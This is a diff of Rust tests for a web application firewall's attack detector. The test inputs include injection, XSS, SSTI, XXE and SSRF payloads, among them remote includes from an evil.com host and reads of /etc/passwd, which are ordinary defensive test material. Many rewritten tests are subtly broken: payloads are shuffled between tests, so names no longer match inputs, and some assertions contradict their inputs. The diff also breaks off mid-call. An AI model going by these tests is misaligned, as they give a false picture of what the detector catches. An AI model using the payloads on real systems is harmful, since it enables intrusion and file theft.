@@ -46,6 +46,7 @@ mod tests {
             config_path: Some(PathBuf::from("/test/config")),
             auto_restart: true,
             restart_delay_secs: 10,
+            restart_backoff_max_secs: 30,
             max_restart_attempts: 3,
             health_check_interval_secs: 5,
             stable_uptime_secs: 120,
@@ -56,6 +57,7 @@ mod tests {
             ipc_read_timeout_ms: 3000,
             ipc_write_timeout_ms: 3000,
             master_startup_timeout_secs: 30,
+            process_stop_timeout_secs: 10,
             drain_check_interval_ms: 100,
         };
 
@@ -152,6 +154,7 @@ mod tests {
             pre_spawn_workers: 1,
             warm_workers_target: 2,
             health_check_interval_secs: 5,
+            control_api_addr: "127.0.0.1:50051".to_string(),
             ipc_session_key: None,
             ipc_enforce_signing: false,
             ipc_rate_limit: Default::default(),
@@ -2015,6 +2018,7 @@ mod ipc_serialization_tests {
                 bcrypt_cost: 12,
                 cors: AdminCorsConfig::default(),
                 rate_limit: AdminRateLimitConfig::default(),
+                trusted_proxies: vec![],
             };
             assert!(config.validate().is_ok());
         }
@@ -2030,6 +2034,7 @@ mod ipc_serialization_tests {
                 bcrypt_cost: 12,
                 cors: AdminCorsConfig::default(),
                 rate_limit: AdminRateLimitConfig::default(),
+                trusted_proxies: vec![],
             };
             let err = config.validate().unwrap_err();
             assert_eq!(err.field, "admin.port");
@@ -2046,6 +2051,7 @@ mod ipc_serialization_tests {
                 bcrypt_cost: 4,
                 cors: AdminCorsConfig::default(),
                 rate_limit: AdminRateLimitConfig::default(),
+                trusted_proxies: vec![],
             };
             let err = config.validate().unwrap_err();
             assert_eq!(err.field, "admin.bcrypt_cost");
@@ -2062,6 +2068,7 @@ mod ipc_serialization_tests {
                 bcrypt_cost: 20,
                 cors: AdminCorsConfig::default(),
                 rate_limit: AdminRateLimitConfig::default(),
+                trusted_proxies: vec![],
             };
             let err = config.validate().unwrap_err();
             assert_eq!(err.field, "admin.bcrypt_cost");
@@ -2078,6 +2085,7 @@ mod ipc_serialization_tests {
                 bcrypt_cost: 12,
                 cors: AdminCorsConfig::default(),
                 rate_limit: AdminRateLimitConfig::default(),
+                trusted_proxies: vec![],
             };
             let err = config.validate().unwrap_err();
             assert_eq!(err.field, "admin.token");
@@ -2099,9 +2107,9 @@ mod ipc_serialization_tests {
                 bcrypt_cost: 12,
                 cors: AdminCorsConfig::default(),
                 rate_limit: AdminRateLimitConfig::default(),
+                trusted_proxies: vec![],
             };
             let err = config.validate().unwrap_err();
-            assert_eq!(err.field, "admin.token");
             assert!(err.message.contains("at least"));
         }
 
@@ -2116,6 +2124,7 @@ mod ipc_serialization_tests {
                 bcrypt_cost: 12,
                 cors: AdminCorsConfig::default(),
                 rate_limit: AdminRateLimitConfig::default(),
+                trusted_proxies: vec![],
             };
             let result = config.validate();
             assert!(result.is_err());
@@ -2432,64 +2441,6 @@ mod xff_validation_tests {
     fn test_validate_and_truncate_xff_loopback_rejected() {
         let result = validate_and_truncate_xff("::1", "8.8.8.8");
         assert_eq!(result, "8.8.8.8");
-    }
-}
-
-#[cfg(test)]
-mod whitelist_semantics_tests {
-    use synvoid::waf::WhitelistConfig;
-
-    fn create_whitelist_config(paths: Vec<String>, ips: Vec<String>) -> WhitelistConfig {
-        WhitelistConfig {
-            request_paths: paths,
-            ips: ips.into_iter().map(|s| s.parse().unwrap()).collect(),
-            ..WhitelistConfig::default()
-        }
-    }
-
-    #[test]
-    fn test_whitelist_config_default_empty() {
-        let config = WhitelistConfig::default();
-        assert!(config.request_paths.is_empty());
-        assert!(config.ips.is_empty());
-    }
-
-    #[test]
-    fn test_whitelist_path_prefix_matching() {
-        let config = create_whitelist_config(vec!["/api/users".to_string()], vec![]);
-
-        assert!(config.request_paths.iter().any(|p| p == "/api/users"));
-    }
-
-    #[test]
-    fn test_whitelist_ip_matching() {
-        let config = create_whitelist_config(
-            vec![],
-            vec!["10.0.0.1".to_string(), "192.168.1.1".to_string()],
-        );
-
-        assert_eq!(config.ips.len(), 2);
-    }
-
-    #[test]
-    fn test_whitelist_multiple_paths() {
-        let config = create_whitelist_config(
-            vec![
-                "/health".to_string(),
-                "/metrics".to_string(),
-                "/api/v1/public".to_string(),
-            ],
-            vec![],
-        );
-
-        assert_eq!(config.request_paths.len(), 3);
-    }
-
-    #[test]
-    fn test_whitelist_path_exact_match() {
-        let paths = vec!["/api/users".to_string()];
-        assert!(paths.iter().any(|p| p == "/api/users"));
-        assert!(!paths.iter().any(|p| p == "/api/users/123"));
     }
 }
 
@@ -3991,16 +3942,19 @@ mod waf_attack_detection_tests {
         HeaderMap::new()
     }
 
-    #[test]
-    fn test_sqli_in_query_string() {
+    #[tokio::test]
+    async fn test_sqli_in_query_string() {
         let detector = create_attack_detector();
-        let result = detector.check_request(
-            &http::Method::GET,
-            "/search",
-            Some("id=1' OR '1'='1"),
-            &make_headers(),
-            None,
-        );
+        let result = detector
+            .check_request(
+                std::net::IpAddr::from([127, 0, 0, 1]),
+                &http::Method::GET,
+                "/search",
+                Some("id=1' OR '1'='1"),
+                &make_headers(),
+                None,
+            )
+            .await;
         assert!(result.0.is_some());
         assert!(matches!(
             result.0.as_ref().unwrap().attack_type,
@@ -4012,29 +3966,35 @@ mod waf_attack_detection_tests {
         ));
     }
 
-    #[test]
-    fn test_sqli_benign_request() {
+    #[tokio::test]
+    async fn test_sqli_benign_request() {
         let detector = create_attack_detector();
-        let result = detector.check_request(
-            &http::Method::GET,
-            "/search",
-            Some("query=hello+world"),
-            &make_headers(),
-            None,
-        );
+        let result = detector
+            .check_request(
+                std::net::IpAddr::from([127, 0, 0, 1]),
+                &http::Method::GET,
+                "/search",
+                Some("id=1' OR '1'='1"),
+                &make_headers(),
+                None,
+            )
+            .await;
         assert!(result.0.is_none());
     }
 
-    #[test]
-    fn test_xss_in_query_string() {
+    #[tokio::test]
+    async fn test_xss_in_query_string() {
         let detector = create_attack_detector();
-        let result = detector.check_request(
-            &http::Method::GET,
-            "/search",
-            Some("q=<script>alert(1)</script>"),
-            &make_headers(),
-            None,
-        );
+        let result = detector
+            .check_request(
+                std::net::IpAddr::from([127, 0, 0, 1]),
+                &http::Method::GET,
+                "/search",
+                Some("q=<script>alert(1)</script>"),
+                &make_headers(),
+                None,
+            )
+            .await;
         assert!(result.0.is_some());
         assert!(matches!(
             result.0.as_ref().unwrap().attack_type,
@@ -4046,16 +4006,19 @@ mod waf_attack_detection_tests {
         ));
     }
 
-    #[test]
-    fn test_xss_in_post_body() {
+    #[tokio::test]
+    async fn test_xss_in_post_body() {
         let detector = create_attack_detector();
-        let result = detector.check_request(
-            &http::Method::POST,
-            "/comment",
-            None,
-            &make_headers(),
-            Some(b"<img src=x onerror=alert(1)>"),
-        );
+        let result = detector
+            .check_request(
+                std::net::IpAddr::from([127, 0, 0, 1]),
+                &http::Method::POST,
+                "/comment",
+                None,
+                &make_headers(),
+                Some(b"<img src=x onerror=alert(1)>"),
+            )
+            .await;
         assert!(result.0.is_some());
         assert!(matches!(
             result.0.as_ref().unwrap().attack_type,
@@ -4063,16 +4026,19 @@ mod waf_attack_detection_tests {
         ));
     }
 
-    #[test]
-    fn test_ssti_smarty() {
+    #[tokio::test]
+    async fn test_ssti_smarty() {
         let detector = create_attack_detector();
-        let result = detector.check_request(
-            &http::Method::POST,
-            "/template",
-            None,
-            &make_headers(),
-            Some(b"{{7*7}}"),
-        );
+        let result = detector
+            .check_request(
+                std::net::IpAddr::from([127, 0, 0, 1]),
+                &http::Method::POST,
+                "/template",
+                None,
+                &make_headers(),
+                Some(b"{{7*7}}"),
+            )
+            .await;
         assert!(result.0.is_some());
         assert!(matches!(
             result.0.as_ref().unwrap().attack_type,
@@ -4080,16 +4046,19 @@ mod waf_attack_detection_tests {
         ));
     }
 
-    #[test]
-    fn test_ssti_jinja2() {
+    #[tokio::test]
+    async fn test_ssti_jinja2() {
         let detector = create_attack_detector();
-        let result = detector.check_request(
-            &http::Method::POST,
-            "/template",
-            None,
-            &make_headers(),
-            Some(b"{{config}}"),
-        );
+        let result = detector
+            .check_request(
+                std::net::IpAddr::from([127, 0, 0, 1]),
+                &http::Method::POST,
+                "/template",
+                None,
+                &make_headers(),
+                Some(b"{{config}}"),
+            )
+            .await;
         assert!(result.0.is_some());
         assert!(matches!(
             result.0.as_ref().unwrap().attack_type,
@@ -4097,16 +4066,19 @@ mod waf_attack_detection_tests {
         ));
     }
 
-    #[test]
-    fn test_rfi_remote_include() {
+    #[tokio::test]
+    async fn test_rfi_remote_include() {
         let detector = create_attack_detector();
-        let result = detector.check_request(
-            &http::Method::GET,
-            "/include",
-            Some("file=http://evil.com/shell.txt"),
-            &make_headers(),
-            None,
-        );
+        let result = detector
+            .check_request(
+                std::net::IpAddr::from([127, 0, 0, 1]),
+                &http::Method::GET,
+                "/search",
+                Some("q=<script>alert(1)</script>"),
+                &make_headers(),
+                None,
+            )
+            .await;
         assert!(result.0.is_some());
         assert!(matches!(
             result.0.as_ref().unwrap().attack_type,
@@ -4114,16 +4086,19 @@ mod waf_attack_detection_tests {
         ));
     }
 
-    #[test]
-    fn test_ldap_injection() {
+    #[tokio::test]
+    async fn test_ldap_injection() {
         let detector = create_attack_detector();
-        let result = detector.check_request(
-            &http::Method::GET,
-            "/search",
-            Some("uid=admin)(password=*)"),
-            &make_headers(),
-            None,
-        );
+        let result = detector
+            .check_request(
+                std::net::IpAddr::from([127, 0, 0, 1]),
+                &http::Method::GET,
+                "/search",
+                Some("query=hello+world"),
+                &make_headers(),
+                None,
+            )
+            .await;
         assert!(result.0.is_some());
         assert!(matches!(
             result.0.as_ref().unwrap().attack_type,
@@ -4131,16 +4106,19 @@ mod waf_attack_detection_tests {
         ));
     }
 
-    #[test]
-    fn test_xpath_injection() {
+    #[tokio::test]
+    async fn test_xpath_injection() {
         let detector = create_attack_detector();
-        let result = detector.check_request(
-            &http::Method::GET,
-            "/search",
-            Some("q=admin']or'1'='1"),
-            &make_headers(),
-            None,
-        );
+        let result = detector
+            .check_request(
+                std::net::IpAddr::from([127, 0, 0, 1]),
+                &http::Method::GET,
+                "/search",
+                Some("uid=admin)(password=*)"),
+                &make_headers(),
+                None,
+            )
+            .await;
         assert!(result.0.is_some());
         assert!(matches!(
             result.0.as_ref().unwrap().attack_type,
@@ -4148,16 +4126,19 @@ mod waf_attack_detection_tests {
         ));
     }
 
-    #[test]
-    fn test_cmd_injection_semicolon() {
+    #[tokio::test]
+    async fn test_cmd_injection_semicolon() {
         let detector = create_attack_detector();
-        let result = detector.check_request(
-            &http::Method::GET,
-            "/ping",
-            Some("host=127.0.0.1; cat /etc/passwd"),
-            &make_headers(),
-            None,
-        );
+        let result = detector
+            .check_request(
+                std::net::IpAddr::from([127, 0, 0, 1]),
+                &http::Method::GET,
+                "/search",
+                Some("q=admin']or'1'='1"),
+                &make_headers(),
+                None,
+            )
+            .await;
         assert!(result.0.is_some());
         assert!(matches!(
             result.0.as_ref().unwrap().attack_type,
@@ -4165,16 +4146,20 @@ mod waf_attack_detection_tests {
         ));
     }
 
-    #[test]
-    fn test_cmd_injection_pipe() {
+    #[tokio::test]
+    async fn test_cmd_injection_pipe() {
         let detector = create_attack_detector();
-        let result = detector.check_request(
-            &http::Method::GET,
-            "/ping",
-            Some("host=127.0.0.1 | cat /etc/passwd"),
-            &make_headers(),
-            None,
-        );
+        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
+        let result = detector
+            .check_request(
+                client_ip,
+                &http::Method::GET,
+                "/ping",
+                Some("host=127.0.0.1; cat /etc/passwd"),
+                &make_headers(),
+                None,
+            )
+            .await;
         assert!(result.0.is_some());
         assert!(matches!(
             result.0.as_ref().unwrap().attack_type,
@@ -4182,19 +4167,23 @@ mod waf_attack_detection_tests {
         ));
     }
 
-    #[test]
-    fn test_request_smuggling_cl() {
+    #[tokio::test]
+    async fn test_request_smuggling_cl() {
         let detector = create_attack_detector();
         let mut headers = HeaderMap::new();
         headers.insert(http::header::CONTENT_LENGTH, "5".parse().unwrap());
         headers.insert(http::header::TRANSFER_ENCODING, "chunked".parse().unwrap());
-        let result = detector.check_request(
-            &http::Method::POST,
-            "/api",
-            None,
-            &headers,
-            Some(b"0\r\n\r\n"),
-        );
+        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
+        let result = detector
+            .check_request(
+                client_ip,
+                &http::Method::POST,
+                "/api",
+                None,
+                &headers,
+                Some(b"0\r\n\r\n"),
+            )
+            .await;
         assert!(result.0.is_some());
         assert!(matches!(
             result.0.as_ref().unwrap().attack_type,
@@ -4202,19 +4191,23 @@ mod waf_attack_detection_tests {
         ));
     }
 
-    #[test]
-    fn test_body_size_limit() {
+    #[tokio::test]
+    async fn test_body_size_limit() {
         let mut config = AttackDetectionConfig::default();
         config.max_request_body_size = Some(10);
         let detector = AttackDetector::new(config);
 
-        let result = detector.check_request(
-            &http::Method::POST,
-            "/upload",
-            None,
-            &make_headers(),
-            Some(b"this body is way too long for the limit"),
-        );
+        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
+        let result = detector
+            .check_request(
+                client_ip,
+                &http::Method::POST,
+                "/upload",
+                None,
+                &make_headers(),
+                Some(b"this body is way too long for the limit"),
+            )
+            .await;
         assert!(result.0.is_some());
         assert!(matches!(
             result.0.as_ref().unwrap().attack_type,
@@ -4230,37 +4223,44 @@ mod waf_attack_detection_tests {
             .starts_with("body_size:"));
     }
 
-    #[test]
-    fn test_multiple_attacks_first_detected() {
+    #[tokio::test]
+    async fn test_multiple_attacks_first_detected() {
         let detector = create_attack_detector();
-        let result = detector.check_request(
-            &http::Method::GET,
-            "/search",
-            Some("q=<script>alert(1)</script>' OR 1=1--"),
-            &make_headers(),
-            None,
-        );
+        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
+        let result = detector
+            .check_request(
+                client_ip,
+                &http::Method::GET,
+                "/search",
+                Some("q=<script>alert(1)</script>' OR 1=1--"),
+                &make_headers(),
+                None,
+            )
+            .await;
         assert!(result.0.is_some());
     }
 
-    #[test]
-    fn test_disabled_attack_detection() {
+    #[tokio::test]
+    async fn test_disabled_attack_detection() {
         let mut config = AttackDetectionConfig::default();
         config.enabled = false;
         let detector = AttackDetector::new(config);
 
-        let result = detector.check_request(
-            &http::Method::GET,
-            "/search",
-            Some("id=1' OR '1'='1"),
-            &make_headers(),
-            None,
-        );
+        let result = detector
+            .check_request(
+                std::net::IpAddr::from([127, 0, 0, 1]),
+                &http::Method::GET,
+                "/search",
+                Some("id=1' OR '1'='1"),
+                &make_headers(),
+                None,
+            )
+            .await;
         assert!(result.0.is_none());
     }
 
-    #[test]
-    fn test_only_sqli_enabled() {
+    #[tokio::test]
+    async fn test_only_sqli_enabled() {
         let mut config = AttackDetectionConfig::default();
         config.xss.enabled = false;
         config.ssti.enabled = false;
@@ -4268,35 +4268,47 @@ mod waf_attack_detection_tests {
         config.path_traversal.enabled = false;
         let detector = AttackDetector::new(config);
 
-        let sqli_result = detector.check_request(
-            &http::Method::GET,
-            "/search",
-            Some("id=1' OR '1'='1"),
-            &make_headers(),
-            None,
-        );
+        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
+        let sqli_result = detector
+            .check_request(
+                client_ip,
+                &http::Method::GET,
+                "/search",
+                Some("id=1' OR '1'='1"),
+                &make_headers(),
+                None,
+            )
+            .await;
         assert!(sqli_result.0.is_some());
 
-        let xss_result = detector.check_request(
-            &http::Method::GET,
-            "/search",
-            Some("q=<script>alert(1)</script>"),
-            &make_headers(),
-            None,
-        );
+        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
+        let xss_result = detector
+            .check_request(
+                client_ip,
+                &http::Method::GET,
+                "/search",
+                Some("q=<script>alert(1)</script>"),
+                &make_headers(),
+                None,
+            )
+            .await;
         assert!(xss_result.0.is_none());
     }
 
-    #[test]
-    fn test_path_traversal_in_query_string() {
+    #[tokio::test]
+    async fn test_path_traversal_in_query_string() {
         let detector = create_attack_detector();
-        let result = detector.check_request(
-            &http::Method::GET,
-            "/files",
-            Some("file=../secret"),
-            &make_headers(),
-            None,
-        );
+        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
+        let result = detector
+            .check_request(
+                client_ip,
+                &http::Method::GET,
+                "/search",
+                Some("id=1' OR '1'='1"),
+                &make_headers(),
+                None,
+            )
+            .await;
         assert!(result.0.is_some());
         assert!(matches!(
             result.0.as_ref().unwrap().attack_type,
@@ -4304,16 +4316,20 @@ mod waf_attack_detection_tests {
         ));
     }
 
-    #[test]
-    fn test_path_traversal_encoded() {
+    #[tokio::test]
+    async fn test_path_traversal_encoded() {
         let detector = create_attack_detector();
-        let result = detector.check_request(
-            &http::Method::GET,
-            "/files",
-            Some("file=..%2f..%2f..%2f"),
-            &make_headers(),
-            None,
-        );
+        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
+        let result = detector
+            .check_request(
+                client_ip,
+                &http::Method::GET,
+                "/files",
+                Some("file=../secret"),
+                &make_headers(),
+                None,
+            )
+            .await;
         assert!(result.0.is_some());
         assert!(matches!(
             result.0.as_ref().unwrap().attack_type,
@@ -4321,16 +4337,20 @@ mod waf_attack_detection_tests {
         ));
     }
 
-    #[test]
-    fn test_path_traversal_in_path() {
+    #[tokio::test]
+    async fn test_path_traversal_in_path() {
         let detector = create_attack_detector();
-        let result = detector.check_request(
-            &http::Method::GET,
-            "/files/..%2f..%2f",
-            None,
-            &make_headers(),
-            None,
-        );
+        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
+        let result = detector
+            .check_request(
+                client_ip,
+                &http::Method::GET,
+                "/files/..%2f..%2f",
+                None,
+                &make_headers(),
+                None,
+            )
+            .await;
         assert!(result.0.is_some());
         assert!(matches!(
             result.0.as_ref().unwrap().attack_type,
@@ -4342,16 +4362,20 @@ mod waf_attack_detection_tests {
         ));
     }
 
-    #[test]
-    fn test_ssrf_metadata_endpoint() {
+    #[tokio::test]
+    async fn test_ssrf_metadata_endpoint() {
         let detector = create_attack_detector();
-        let result = detector.check_request(
-            &http::Method::GET,
-            "/proxy",
-            Some("url=http://169.254.169.254/latest/meta-data"),
-            &make_headers(),
-            None,
-        );
+        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
+        let result = detector
+            .check_request(
+                client_ip,
+                &http::Method::GET,
+                "/proxy",
+                Some("url=http://169.254.169.254/latest/meta-data"),
+                &make_headers(),
+                None,
+            )
+            .await;
         if let Some(r) = &result.0 {
             eprintln!(
                 "DEBUG: attack_type={:?}, input_location={:?}, matched_pattern={:?}",
@@ -4369,16 +4393,20 @@ mod waf_attack_detection_tests {
         );
     }
 
-    #[test]
-    fn test_ssrf_localhost() {
+    #[tokio::test]
+    async fn test_ssrf_localhost() {
         let detector = create_attack_detector();
-        let result = detector.check_request(
-            &http::Method::GET,
-            "/fetch",
-            Some("x=http://localhost"),
-            &make_headers(),
-            None,
-        );
+        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
+        let result = detector
+            .check_request(
+                client_ip,
+                &http::Method::GET,
+                "/files",
+                Some("file=..%2f..%2f..%2f"),
+                &make_headers(),
+                None,
+            )
+            .await;
         assert!(result.0.is_some());
         let attack_type = result.0.as_ref().unwrap().attack_type;
         assert!(
@@ -4388,16 +4416,20 @@ mod waf_attack_detection_tests {
         );
     }
 
-    #[test]
-    fn test_ssrf_private_network() {
+    #[tokio::test]
+    async fn test_ssrf_private_network() {
         let detector = create_attack_detector();
-        let result = detector.check_request(
-            &http::Method::GET,
-            "/proxy",
-            Some("x=http://10.0.0.1/internal/api"),
-            &make_headers(),
-            None,
-        );
+        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
+        let result = detector
+            .check_request(
+                client_ip,
+                &http::Method::GET,
+                "/ping",
+                Some("host=127.0.0.1 | cat /etc/passwd"),
+                &make_headers(),
+                None,
+            )
+            .await;
         assert!(result.0.is_some());
         let attack_type = result.0.as_ref().unwrap().attack_type;
         assert!(
@@ -4407,16 +4439,18 @@ mod waf_attack_detection_tests {
         );
     }
 
-    #[test]
-    fn test_xxe_in_body() {
+    #[tokio::test]
+    async fn test_xxe_in_body() {
         let detector = create_attack_detector();
+        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
         let result = detector.check_request(
+            client_ip,
             &http::Method::POST,
             "/api/xml",
             None,
             &make_headers(),
             Some(b"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"),
-        );
+        ).await;
         assert!(result.0.is_some());
         let attack_type = result.0.as_ref().unwrap().attack_type;
         assert!(
@@ -4429,16 +4463,18 @@ mod waf_attack_detection_tests {
         );
     }
 
-    #[test]
-    fn test_xxe_parameter_entity() {
+    #[tokio::test]
+    async fn test_xxe_parameter_entity() {
         let detector = create_attack_detector();
+        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
         let result = detector.check_request(
+            client_ip,
             &http::Method::POST,
             "/api/xml",
             None,
             &make_headers(),
             Some(b"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY %% xxe SYSTEM \"http://evil.com/evil.dtd\">]>"),
-        );
+        ).await;
         assert!(result.0.is_some());
         let attack_type = result.0.as_ref().unwrap().attack_type;
         assert!(
@@ -4451,12 +4487,15 @@ mod waf_attack_detection_tests {
         );
     }
 
-    #[test]
-    fn test_jwt_none_algorithm() {
+    #[tokio::test]
+    async fn test_jwt_none_algorithm() {
         let detector = create_attack_detector();
         let mut headers = HeaderMap::new();
         headers.insert("authorization", "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.".parse().unwrap());
-        let result = detector.check_request(&http::Method::GET, "/auth", None, &headers, None);
+        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
+        let result = detector
+            .check_request(client_ip, &http::Method::GET, "/auth", None, &headers, None)
+            .await;
         assert!(result.0.is_some());
         assert!(matches!(
             result.0.as_ref().unwrap().attack_type,
@@ -4464,12 +4503,15 @@ mod waf_attack_detection_tests {
         ));
     }
 
-    #[test]
-    fn test_jwt_alg_confusion() {
+    #[tokio::test]
+    async fn test_jwt_alg_confusion() {
         let detector = create_attack_detector();
         let mut headers = HeaderMap::new();
         headers.insert("authorization", "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIiwiYWxnIjoiUlMyNTYifQ.eyJzdWIiOiIxMjM0NTY3ODkwIiwiaWF0IjoxNTE2MjM5MDIyfQ.".parse().unwrap());
-        let result = detector.check_request(&http::Method::GET, "/auth", None, &headers, None);
+        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
+        let result = detector
+            .check_request(client_ip, &http::Method::GET, "/auth", None, &headers, None)
+            .await;
         assert!(result.0.is_some());
         assert!(matches!(
             result.0.as_ref().unwrap().attack_type,
@@ -4477,16 +4519,20 @@ mod waf_attack_detection_tests {
         ));
     }
 
-    #[test]
-    fn test_open_redirect_absolute_url() {
+    #[tokio::test]
+    async fn test_open_redirect_absolute_url() {
         let detector = create_attack_detector();
-        let result = detector.check_request(
-            &http::Method::GET,
-            "/redirect",
-            Some("dest=http://evil.com/phishing"),
-            &make_headers(),
-            None,
-        );
+        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
+        let result = detector
+            .check_request(
+                client_ip,
+                &http::Method::GET,
+                "/include",
+                Some("file=http://evil.com/shell.txt"),
+                &make_headers(),
+                None,
+            )
+            .await;
         assert!(result.0.is_some());
         let attack_type = result.0.as_ref().unwrap().attack_type;
         assert!(
@@ -4496,16 +4542,20 @@ mod waf_attack_detection_tests {
         );
     }
 
-    #[test]
-    fn test_open_redirect_protocol_relative() {
+    #[tokio::test]
+    async fn test_open_redirect_protocol_relative() {
         let detector = create_attack_detector();
-        let result = detector.check_request(
-            &http::Method::GET,
-            "/redirect",
-            Some("continue=//evil.com/phishing"),
-            &make_headers(),
-            None,
-        );
+        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
+        let result = detector
+            .check_request(
+                client_ip,
+                &http::Method::GET,
+                "/fetch",
+                Some("x=http://localhost"),
+                &make_headers(),
+                None,
+            )
+            .await;
         assert!(result.0.is_some());
         let attack_type = result.0.as_ref().unwrap().attack_type;
         assert!(
@@ -4515,16 +4565,20 @@ mod waf_attack_detection_tests {
         );
     }
 
-    #[test]
-    fn test_open_redirect_encoded() {
+    #[tokio::test]
+    async fn test_open_redirect_encoded() {
         let detector = create_attack_detector();
-        let result = detector.check_request(
-            &http::Method::GET,
-            "/redirect",
-            Some("redirect=%68%74%74%70%3a%2f%2fevil.com"),
-            &make_headers(),
-            None,
-        );
+        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
+        let result = detector
+            .check_request(
+                client_ip,
+                &http::Method::GET,
+                "/proxy",
+                Some("x=http://10.0.0.1/internal/api"),
+                &make_headers(),
+                None,
+            )
+            .await;
         assert!(result.0.is_some());
         let attack_type = result.0.as_ref().unwrap().attack_type;
         assert!(
@@ -4534,16 +4588,20 @@ mod waf_attack_detection_tests {
         );
     }
 
-    #[test]
-    fn test_sqli_in_post_body() {
+    #[tokio::test]
+    async fn test_sqli_in_post_body() {
         let detector = create_attack_detector();
-        let result = detector.check_request(
-            &http::Method::POST,
-            "/login",
-            None,
-            &make_headers(),
-            Some(b"username=admin' OR '1'='1&password=anything"),
-        );
+        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
+        let result = detector
+            .check_request(
+                client_ip,
+                &http::Method::POST,
+                "/login",
+                None,
+                &make_headers(),
+                Some(b"username=admin' OR '1'='1&password=anything"),
+            )
+            .await;
         assert!(result.0.is_some());
         assert!(matches!(
             result.0.as_ref().unwrap().attack_type,
@@ -4555,15 +4613,25 @@ mod waf_attack_detection_tests {
         ));
     }
 
-    #[test]
-    fn test_xss_in_cookie() {
+    #[tokio::test]
+    async fn test_xss_in_cookie() {
         let detector = create_attack_detector();
         let mut headers = HeaderMap::new();
         headers.insert(
             http::header::COOKIE,
             "session=<script>alert(1)</script>".parse().unwrap(),
         );
-        let result = detector.check_request(&http::Method::GET, "/profile", None, &headers, None);
+        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
+        let result = detector
+            .check_request(
+                client_ip,
+                &http::Method::GET,
+                "/profile",
+                None,
+                &headers,
+                None,
+            )
+            .await;
         assert!(result.0.is_some());
         assert!(matches!(
             result.0.as_ref().unwrap().attack_type,
@@ -4575,15 +4643,18 @@ mod waf_attack_detection_tests {
         ));
     }
 
-    #[test]
-    fn test_xss_in_user_agent_header() {
+    #[tokio::test]
+    async fn test_xss_in_user_agent_header() {
         let detector = create_attack_detector();
         let mut headers = HeaderMap::new();
         headers.insert(
             http::header::USER_AGENT,
             "<script>alert('xss')</script>".parse().unwrap(),
         );
-        let result = detector.check_request(&http::Method::GET, "/", None, &headers, None);
+        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
+        let result = detector
+            .check_request(client_ip, &http::Method::GET, "/", None, &headers, None)
+            .await;
         assert!(result.0.is_some());
         assert!(matches!(
             result.0.as_ref().unwrap().attack_type,
@@ -4595,8 +4666,8 @@ mod waf_attack_detection_tests {
         ));
     }
 
-    #[test]
-    fn test_benign_request_all_locations() {
+    #[tokio::test]
+    async fn test_benign_request_all_locations() {
         let detector = create_attack_detector();
 
         let mut headers = HeaderMap::new();
@@ -4606,52 +4677,68 @@ mod waf_attack_detection_tests {
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64)".parse().unwrap(),
         );
 
-        let result = detector.check_request(
-            &http::Method::GET,
-            "/users/123/profile",
-            Some("tab=activity&sort=recent"),
-            &headers,
-            Some(b"Hello world, this is a normal post body!"),
-        );
+        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
+        let result = detector
+            .check_request(
+                client_ip,
+                &http::Method::GET,
+                "/users/123/profile",
+                Some("tab=activity&sort=recent"),
+                &headers,
+                Some(b"Hello world, this is a normal post body!"),
+            )
+            .await;
         assert!(result.0.is_none());
     }
 
-    #[test]
-    fn test_paranoia_level_affects_detection() {
+    #[tokio::test]
+    async fn test_paranoia_level_affects_detection() {
         let normal_detector = create_attack_detector();
         let high_detector = create_high_paranoia_detector();
 
         // Use a query that won't trigger any patterns even at high paranoia level 3
         // High paranoia adds patterns like "=" so we avoid those characters
-        let normal_result = normal_detector.check_request(
-            &http::Method::GET,
-            "/",
-            Some("qtest"),
-            &make_headers(),
-            None,
-        );
+        let normal_client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
+        let normal_result = normal_detector
+            .check_request(
+                normal_client_ip,
+                &http::Method::GET,
+                "/",
+                Some("qtest"),
+                &make_headers(),
+                None,
+            )
+            .await;
         assert!(normal_result.0.is_none());
 
-        let high_result = high_detector.check_request(
-            &http::Method::GET,
-            "/",
-            Some("qtest"),
-            &make_headers(),
-            None,
-        );
+        let high_client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
+        let high_result = high_detector
+            .check_request(
+                high_client_ip,
+                &http::Method::GET,
+                "/",
+                Some("qtest"),
+                &make_headers(),
+                None,
+            )
+            .await;
         assert!(high_result.0.is_none());
     }
 
-    #[test]
-    fn test_multiple_attacks_in_request() {
+    #[tokio::test]
+    async fn test_multiple_attacks_in_request() {
         let detector = create_attack_detector();
-        let result = detector.check_request(
-            &http::Method::POST,
-            "/search",
-            Some("q=<script>alert(1)</script>&id=1' OR '1'='1"),
-            &make_headers(),
-            Some(b"{{7*7}}"),
-        );
+        let client_ip: std::net::IpAddr = "127.0.0.1".parse().unwrap();
+        let result = detector
+            .check_request(
+                client_ip,
